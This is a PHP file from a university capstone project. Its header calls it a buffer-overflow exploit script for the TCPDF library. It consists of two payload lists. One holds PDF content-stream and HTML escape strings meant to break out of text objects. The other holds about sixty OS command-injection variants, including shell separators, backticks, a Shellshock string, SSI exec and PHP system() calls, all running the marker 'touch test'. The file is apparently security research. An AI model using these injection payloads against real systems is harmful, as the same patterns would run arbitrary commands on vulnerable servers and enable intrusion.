<!-- File: buffer.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (Buffer Overflow) for TCPDF -->
<?php

$escape_seq = array(
// OBJECT ESCAPE
"hacker\\",
"hacker)",
"hacker\)",
"hacker\\\\",
"hacker\xE2\x9C\x94",
"hacker\xF0\x9F\x8D\xA3",
"hacker\xE2\x98\xBA",
"hacker\xE2\x9D\xA4",
"hacker\xF0\x9F\x8C\xB8",
"hacker&rpar;",
"hacker&#41;",
"hacker&bsol;",
"hacker&#92;",
"hacker󶶜",
"hacker✓",
"hackerܮ",
"hacker ܏ ",
"hackerܢ ",
" hacker© ",
"hacker Ʃ ",
"hacker⩾",
"hackerΩ",
"hackerω",
"hacker💩",
"hackerỨ",
"hackerứ",
"hacker↩",
"hackerÉ",
"hackeré",
"hacker𝐩",
"hacker𝑩",
"hacker𐩥",
"hackerʩ",
"hacker⍩",
"hacker🀩",
"hacker𐢩",
"hacker╩",
"hacker%%EOF",
"hacker ",
"hacker	",
"hacker",
"hacker
",
"hacker\\)] TJ ET
endstream",
"'hacker\\\\)] TJ ET
endstream",
"hacker\\)] TJ ET
endstream",
"hacker󶶜] TJ ET
endstream",
"hacker󶶜] TJ ET
endstream",
"hacker✓] TJ ET
endstream",
"hacker✓] TJ ET
endstream",
"hackerܮ] TJ ET
endstream",
"hackerܮ] TJ ET
endstream",
"hacker ܏ ] TJ ET
endstream",
"hacker ܏ ] TJ ET
endstream",
"hackerܢ ] TJ ET
endstream",
"hackerܢ ] TJ ET
endstream",
"hacker)] TJ ET
endstream",
"hacker©] TJ ET
endstream",
"hackerƩ] TJ ET
endstream",
"hacker⩾] TJ ET
endstream",
"hackerΩ] TJ ET
endstream",
"hackerω] TJ ET
endstream",
"hacker💩] TJ ET
endstream",
"hackerỨ] TJ ET
endstream",
"hackerứ] TJ ET
endstream",
"hacker↩] TJ ET
endstream",
"hackerÉ] TJ ET
endstream",
"hackeré] TJ ET
endstream",
"hacker𝐩] TJ ET
endstream",
"hacker𝑩] TJ ET
endstream",
"hacker𐩥] TJ ET
endstream",
"hackerʩ] TJ ET
endstream",
"hacker⍩] TJ ET
endstream",
"hacker🀩] TJ ET
endstream",
"hacker𐢩] TJ ET
endstream",
"hacker╩] TJ ET
endstream",
"hacker%%EOF)] TJ ET
endstream",
"hacker )] TJ ET
endstream",
"hacker	)] TJ ET
endstream",
"hacker)] TJ ET
endstream",
"hacker
)] TJ ET
endstream",
// HTML ESCAPE
"<h1>Like exploits)\ 
<a href='http://kellsrealwww.com)\' style='text-decoration:none;background-color:#CC0000;color:black;'>linkhere)\</a>
</h1>
"
);

$os_commands = array(
"touch test",
" touch test",
";touch test;",
"; touch test;",
";touch test",
"; touch test",
";system('touch test')",
"; system('touch test')",
"|touch test",
"| touch test",
"|touch test;",
"| touch test;",
"&& touch test",
" && touch test",
"a && touch test",
"a && touch test;",
"1 && touch test",
"1 && touch test;",
"1' && touch test",
"1' && touch test;",
"1' && touch test#",
"a' && touch test",
"a' && touch test;",
"a' && touch test#",
'1" && touch test',
'1" && touch test;',
'1" && touch test#',
'a" && touch test',
'a" && touch test;',
'a" && touch test#',
"& touch test",
" & touch test",
"`touch test`",
"`touch test`",
"a);touch test",
"a;touch test",
"a);touch test;",
"a;touch test;",
"a);touch test|",
"a;touch test|",
"a)|touch test",
"a|touch test",
"a)|touch test;",
"a|touch test",
"&lt;!--#exec%20cmd=&quot;touch%20test&quot;--&gt;",
"&lt;!--#exec%20cmd=&quot;touch%20test;--&gt;",
"%0Atouch%20test",
"%0Atouch%20test%0A",
"$;touch test",
'() { :;}; bash -c "sleep 100 && touch test"',
'() { :;}; bash -c "touch test"',
"$(`touch test`)",
'<!--#exec cmd="touch test";-->',
'<?php system("touch test");?>',
"touch test #",
"touch test#",
" touch test #",
" touch test#"
);

?>